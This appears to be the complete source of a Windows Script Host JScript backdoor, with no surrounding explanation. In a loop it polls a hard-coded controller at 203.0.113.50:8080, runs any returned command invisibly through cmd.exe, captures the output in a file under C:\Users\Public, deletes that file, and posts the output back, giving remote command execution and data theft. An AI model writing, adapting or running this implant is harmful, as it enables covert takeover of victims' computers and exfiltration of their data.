var id = "Qw8rT";
var srv = "http://203.0.113.50:8080/";
var tmpf = "C:\\Users\\Public\\o.txt";
var wsh = new ActiveXObject("WScript.Shell");
var fs = new ActiveXObject("Scripting.FileSystemObject");
function send(u, d) {
  var req = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
  req.Open("POST", u, false);
  req.Send(d + "()" + id);
  var r = req.ResponseText;
  return r.substring(1, r.length - 1);
}
while (true) {
  var c = send(srv + "X" + id, "hi");
  if (c.length > 0) {
    wsh.Run("cmd.exe /c " + c + " > " + tmpf, 0, true);
    var t = fs.OpenTextFile(tmpf, 1);
    var o = t.ReadAll();
    t.Close();
    fs.DeleteFile(tmpf);
    send(srv + "X" + id, o);
  }
  WScript.Sleep(5000);
}
